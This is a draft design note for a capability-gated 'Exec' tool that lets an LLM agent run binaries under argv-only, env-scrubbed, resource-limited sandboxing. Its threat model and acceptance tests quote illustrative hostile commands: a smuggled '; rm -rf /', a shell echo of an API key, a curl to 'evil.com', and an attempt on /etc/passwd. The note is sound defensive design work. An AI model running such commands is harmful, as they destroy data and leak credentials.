# Design Note: Exec Tool — bounded shell execution for agents

- **Status:** Draft
- **Tracking issue:** _to be filed_
- **Author:** @shangdinggu
- **Last updated:** 2026-05-08
- **Builds on:** [`0005-capability-model.md`](./0005-capability-model.md), [`0008-agent-sandbox.md`](./0008-agent-sandbox.md), [`0021-tool-dispatch.md`](./0021-tool-dispatch.md)

This is the most dangerous tool the kernel ships. Letting an LLM
agent run arbitrary binaries on the host is exactly the surface
that historically turns research papers into security incidents.
This RFC defines the boundary that makes it survivable for our
single-user, single-host threat model:

1. **No shell.** Ever. ``shell=True`` never appears. Args are a
   list, never a string. Eliminates command injection entirely.
2. **Absolute-path binaries only.** ``argv[0]`` must start with
   ``/`` and pass ``kernel.cap.check_fs(pid, argv[0], "r")``.
   No ``$PATH`` lookup; no relative paths; no symlink chasing
   beyond what the kernel already permits.
3. **Env scrub.** The child process gets a fixed safe-list
   (``PATH``, ``HOME``, ``LANG``, ``USER``, ``TERM``, ``LC_ALL``)
   plus whatever the caller explicitly passes in
   ``args.env``. Inherited secrets (``ANTHROPIC_API_KEY``,
   ``AWS_*``, ``GITHUB_TOKEN`` …) are dropped.
4. **RLIMIT enforced.** Wraps existing ``run_sandboxed`` from
   RFC 0008. Default policy:
     - cpu_seconds = 60
     - memory_bytes = 512 MB
     - fsize_bytes = 64 MB
     - nofile = 256
     - wall_seconds = 60 (configurable)
5. **Output cap.** stdout / stderr each truncated to 256 KB by
   default (configurable). The tool returns
   ``stdout_truncated=True`` so the LLM knows.
6. **Capability-gated, opt-in.** The tool is **NOT registered
   by ``register_builtin_tools``**. Operators must call
   ``register_exec_tool(registry)`` explicitly. Agents must have
   ``"Exec"`` in their ``tool_grants``.

The tool is named ``Exec`` (not ``Bash``, not ``Shell``) to make
the argv-only contract self-evident in code.

## 1. Threat model

**In scope (the tool defends against):**

- **Command injection via shell metachars.** Eliminated by
  ``shell=False`` + argv list. ``Exec(["echo", "; rm -rf /"])``
  literally runs ``echo`` with one argument; the semicolon is
  not interpreted.
- **PATH manipulation.** The agent can't say
  ``argv=["malicious"]`` and have the supervisor find it on a
  weird path. argv[0] must be absolute.
- **Symlink-into-secret.** fs_grants enforces what paths are
  reachable; agent can't argv[0]=``/etc/passwd`` to read it
  (also: it's not an executable). And reading via tools is what
  the ``Read`` tool is for, not Exec.
- **Env exfiltration.** Default scrub drops the daemon's
  secrets. The agent can't ``Exec(["sh", "-c", "echo
  $ANTHROPIC_API_KEY"])`` (no shell anyway, but even via
  ``Exec(["env"])`` the secret isn't in the env it sees).
- **Resource exhaustion.** RLIMIT_AS bounds memory; RLIMIT_CPU
  bounds CPU time; wall_seconds bounds wall-clock; nofile
  bounds fd count; fsize bounds output file growth.
- **Long-running command stuck.** Wall-clock killer thread
  SIGTERMs then SIGKILLs after grace.
- **Output bomb.** stdout/stderr are tail-truncated; no
  unbounded buffering.

**Out of scope:**

- **Trusted-but-buggy binary.** If the agent is allowed to run
  ``/usr/bin/git`` and ``/usr/bin/git`` itself has a
  remote-code-execution bug, this RFC doesn't help. The
  capability model can revoke ``Exec`` from a misbehaving
  agent, but the binary's own correctness is its problem.
- **Network egress from the child.** The child inherits the
  daemon's network stack. ``Exec(["curl", "evil.com"])`` works
  if curl is in fs_grants and the daemon has internet. RFC 0008
  bubblewrap covers this for runner subprocesses but not for
  one-shot tool exec; future RFC may add ``--unshare-net`` to
  Exec when bubblewrap is available.
- **Timing-channel side-channels.** Out of scope for v1.
- **Truly untrusted code.** If you don't trust the LLM, don't
  give it ``Exec``. Capability is the gate.
- **Untrusted /usr/bin.** The kernel assumes ``/usr/bin/grep``
  is what it claims to be. Defense against tampered system
  binaries is OS-level, not kernel-level.

## 2. Tool specification

### Name

``Exec``

### Args

```jsonc
{
  "argv":             ["/usr/bin/grep", "-n", "TODO", "/path/to/file"],
  "cwd":              "/some/dir",      // optional; absolute; readable per fs_grants
  "env":              {"FOO": "bar"},   // optional additive env (after scrub)
  "timeout_s":        60,               // optional, default 60, max 600
  "max_output_bytes": 262144            // optional, default 256 KB, max 4 MB per stream
}
```

### Validation

- ``argv``: non-empty list of non-empty strings.
- ``argv[0]``: absolute path; ``Path(argv[0]).is_file()`` must be
  True before dispatch; agent's fs_grants must include ``"r"``
  on it (handler calls ``kernel.cap.check_fs`` directly).
- ``cwd``: optional; if set, must be absolute and a directory;
  fs_grants must cover it (mode "r").
- ``env``: dict[str, str]. Keys starting with ``_`` rejected
  (reserved for kernel use). Values must be strings (no None,
  no leakage of complex types).
- ``timeout_s``: 1 ≤ x ≤ 600.
- ``max_output_bytes``: 1 KB ≤ x ≤ 4 MB.

### Result

```jsonc
{
  "exit_code":         0,
  "stdout":            "...",
  "stderr":            "...",
  "stdout_truncated":  false,
  "stderr_truncated":  false,
  "duration_s":        0.123,
  "timed_out":         false
}
```

stdout/stderr are decoded as UTF-8 with errors="replace" — Exec
is text-oriented; binary output isn't expected. (Tools that need
binary output should write to a file via Write tool first.)

### Capability requirements

- ``tool_grants`` must include ``"Exec"``.
- ``fs_grants`` must include ``("r", argv[0])`` (binary must be
  readable per the agent's grants).
- ``fs_grants`` must include ``("r", cwd)`` if ``cwd`` is set.
- The ``requires_fs`` field on the Tool registration is empty;
  the handler does its own fs check (because the args_key has
  to extract a list element, not a top-level field).

## 3. Env scrubbing

Default exposed env:

| Key | Value |
|---|---|
| ``PATH`` | ``/usr/local/bin:/usr/bin:/bin`` |
| ``HOME`` | ``/tmp`` |
| ``LANG`` | ``C.UTF-8`` |
| ``LC_ALL`` | ``C.UTF-8`` |
| ``USER`` | (process owner, e.g. ``cheetah``) |
| ``TERM`` | ``dumb`` |
| ``SHELL`` | ``/bin/sh`` |

The caller's ``env`` arg is **merged on top**. Caller can
override ``PATH`` etc. (e.g. to give a tool a richer PATH if
needed) but cannot bypass the scrub for unset keys.

Anything in ``os.environ`` not in the safe-list and not in
``args.env`` is dropped. This is the secret-leak defence.

Reserved key prefix:

- ``_*`` rejected by ``args.env`` validation.
- ``CC_*`` env keys (kernel-internal) are NOT auto-passed; the
  caller must explicitly add them via ``args.env``.

## 4. Sandbox policy

The handler builds a ``SandboxPolicy``:

```python
policy = SandboxPolicy(
    cpu_seconds   = max(timeout_s, 1),
    memory_bytes  = 512 * 1024 * 1024,    # 512 MB
    fsize_bytes   = 64 * 1024 * 1024,     # 64 MB
    nofile        = 256,
    wall_seconds  = float(timeout_s),
    new_session   = True,
)
```

This is passed to ``run_sandboxed(...)`` from RFC 0008. The
runtime guarantees stay the same: RLIMIT in the child via
preexec_fn, wall-clock killer in the parent, SIGTERM → 1s
grace → SIGKILL on the process group.

bubblewrap is **not** auto-applied for v1 — Exec runs in the
supervisor's namespace. A future RFC may add
``use_bubblewrap=True`` to constrain network / filesystem
further when running tools.

## 5. Audit

The supervisor's existing tool-dispatch audit (RFC 0021 §5)
emits ``tool.call.dispatched`` / ``tool.call.denied`` events.
Exec doesn't add new event kinds; the events' ``payload.tool``
is ``"Exec"`` and ``payload.args`` includes the argv list, so
operators can grep the event log for what was run.

## 6. Backwards compatibility

- Strictly additive new file ``kernel/tools/exec_tool.py``.
- ``register_builtin_tools`` is unchanged; existing setups
  with no Exec capability see no new behaviour.
- ``register_exec_tool(registry)`` is the explicit opt-in.

## 7. Open questions

1. **Should ``stdin`` be supported?** v1 says no — the agent's
   text-only IPC model doesn't have a clean way to pass binary
   stdin. A future RFC may add ``args.stdin``.
2. **Should we run via bubblewrap when available?** Lean yes
   for v1.1, but it's a separate threat-model decision (we'd
   want net deny by default, bind_rw on a scratch dir). Keep
   simple for now.
3. **Output-stream interleaving.** v1 returns stdout and
   stderr separately; an interleaved "what came out when" view
   is a future enhancement.

## 8. Acceptance criteria

A PR claiming this RFC must:

1. ``register_exec_tool`` is NOT called by
   ``register_builtin_tools``; Exec is opt-in.
2. Argv validation rejects: non-list, list with non-str, empty
   list, relative path argv[0], non-existent argv[0].
3. ``shell=True`` is never used; metachars in args don't
   shell-expand: ``Exec(["/bin/echo", "; pwd"])`` outputs
   ``"; pwd"``.
4. capability denied (no ``"Exec"`` in tool_grants) →
   tool_response.error=permission_denied.
5. fs denied on argv[0] → handler raises ToolFsDenied →
   tool_response.error=fs_denied.
6. env scrub: a child started without ``args.env`` and with
   ``ANTHROPIC_API_KEY`` set in the parent does not see it.
7. timeout: ``Exec(["/bin/sleep", "10"], timeout_s=1)``
   returns timed_out=True in under 5 seconds.
8. output cap: a binary that prints 1 MB of stdout under
   ``max_output_bytes=1024`` returns stdout_truncated=True
   with stdout length ≤ 1024.
9. End-to-end via runner_main + supervisor + dispatched
   audit event present.
10. No file outside ``kernel/``, ``tests/``,
    ``docs/RFC/`` modified.
